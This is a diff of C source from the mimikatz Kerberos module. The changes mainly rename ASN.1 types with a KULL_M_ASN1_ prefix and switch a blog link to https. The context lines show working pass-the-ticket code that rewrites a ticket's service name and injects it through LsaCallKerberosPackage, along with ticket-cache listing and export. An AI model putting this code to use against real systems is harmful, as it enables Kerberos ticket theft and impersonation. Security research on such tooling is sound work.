@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
@@ -64,7 +64,7 @@ NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
 BOOL CALLBACK kuhl_m_kerberos_ptt_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
 {
 	PWSTR separator;
-	PrincipalName pAltService;
+	KULL_M_ASN1_PrincipalName pAltService;
 	if(fullpath)
 	{
 		separator = wcschr(fullpath, L'|');
@@ -84,13 +84,13 @@ BOOL CALLBACK kuhl_m_kerberos_ptt_directory(DWORD level, PCWCHAR fullpath, PCWCH
 	return FALSE;
 }
 
-void kuhl_m_kerberos_ptt_file(PCWCHAR filename, PrincipalName *pAltService)
+void kuhl_m_kerberos_ptt_file(PCWCHAR filename, KULL_M_ASN1_PrincipalName *pAltService)
 {
 	NTSTATUS status;
-	KRB_CRED *KrbCred = NULL, outKrbCred = {0};
-	EncKrbCredPart *encKrbCred = NULL;
+	KULL_M_ASN1_KRB_CRED *KrbCred = NULL, outKrbCred = {0};
+	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;
 	OssBuf ossTgtBuff = {0, NULL}, ossOutTgtBuff = {0, NULL};
-	PrincipalName tmp, tmp2;
+	KULL_M_ASN1_PrincipalName tmp, tmp2;
 
 	if(kull_m_file_readData(filename, &ossTgtBuff.value, (PDWORD) &ossTgtBuff.length))
 	{
@@ -106,7 +106,7 @@ void kuhl_m_kerberos_ptt_file(PCWCHAR filename, PrincipalName *pAltService)
 				tmp = KrbCred->tickets->value.sname;
 				KrbCred->tickets->value.sname = *pAltService;
 				
-				if(encKrbCred->ticket_info->value.bit_mask & KrbCredInfo_sname_present)
+				if(encKrbCred->ticket_info->value.bit_mask & KULL_M_ASN1_KrbCredInfo_sname_present)
 				{
 					tmp2 = encKrbCred->ticket_info->value.sname;
 					encKrbCred->ticket_info->value.sname = *pAltService;
@@ -116,9 +116,9 @@ void kuhl_m_kerberos_ptt_file(PCWCHAR filename, PrincipalName *pAltService)
 				outKrbCred.enc_part.cipher.length = 0;
 				outKrbCred.enc_part.cipher.value = NULL;
 
-				if(!ossEncode(&kull_m_kerberos_asn1_world, EncKrbCredPart_PDU, encKrbCred, (OssBuf *) &outKrbCred.enc_part.cipher))
+				if(!ossEncode(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred, (OssBuf *) &outKrbCred.enc_part.cipher))
 				{
-					if(!ossEncode(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, &outKrbCred, &ossOutTgtBuff))
+					if(!ossEncode(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, &outKrbCred, &ossOutTgtBuff))
 					{
 						status = kuhl_m_kerberos_ptt_data(ossOutTgtBuff.value, ossOutTgtBuff.length, NULL);
 						ossFreeBuf(&kull_m_kerberos_asn1_world, ossOutTgtBuff.value);
@@ -129,10 +129,10 @@ void kuhl_m_kerberos_ptt_file(PCWCHAR filename, PrincipalName *pAltService)
 				else PRINT_ERROR(L"Unable to encode EncKrbCredPart: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
 
 				KrbCred->tickets->value.sname = tmp;
-				if(encKrbCred->ticket_info->value.bit_mask & KrbCredInfo_sname_present)
+				if(encKrbCred->ticket_info->value.bit_mask & KULL_M_ASN1_KrbCredInfo_sname_present)
 					encKrbCred->ticket_info->value.sname = tmp2;
-				ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
-				ossFreePDU(&kull_m_kerberos_asn1_world, EncKrbCredPart_PDU, encKrbCred);
+				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
+				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred);
 			}
 		}
 		else status = kuhl_m_kerberos_ptt_data(ossTgtBuff.value, ossTgtBuff.length, NULL);
@@ -146,7 +146,7 @@ void kuhl_m_kerberos_ptt_file(PCWCHAR filename, PrincipalName *pAltService)
 	else PRINT_ERROR_AUTO(L"kull_m_file_readData");
 }
 
-NTSTATUS CALLBACK kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize, PrincipalName *sname)
+NTSTATUS CALLBACK kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize, KULL_M_ASN1_PrincipalName *sname)
 {
 	NTSTATUS status = STATUS_MEMORY_NOT_ALLOCATED, packageStatus;
 	DWORD submitSize, responseSize;
@@ -214,8 +214,8 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 	DWORD szData, i;
 	OssBuf buf = {0, NULL};
 	LPWSTR filename;
-	KRB_CRED *KrbCred = NULL;
-	EncKrbCredPart *encKrbCred = NULL;
+	KULL_M_ASN1_KRB_CRED *KrbCred = NULL;
+	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;
 
 	status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID *) &pKerbCacheResponse, &szData, &packageStatus);
 	if(NT_SUCCESS(status))
@@ -252,8 +252,8 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 										LocalFree(filename);
 									}
 								}
-								ossFreePDU(&kull_m_kerberos_asn1_world, EncKrbCredPart_PDU, encKrbCred);
-								ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
+								ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred);
+								ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
 							}
 							LsaFreeReturnBuffer(pKerbRetrieveResponse);
 						}
@@ -283,8 +283,8 @@ NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
 	USHORT dwTarget;
 	OssBuf buf = {0, NULL};
 	LPWSTR filename;
-	KRB_CRED *KrbCred = NULL;
-	EncKrbCredPart *encKrbCred = NULL;
+	KULL_M_ASN1_KRB_CRED *KrbCred = NULL;
+	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;
 
 	if(kull_m_string_args_byName(argc, argv, L"service", &szTarget, NULL))
 	{
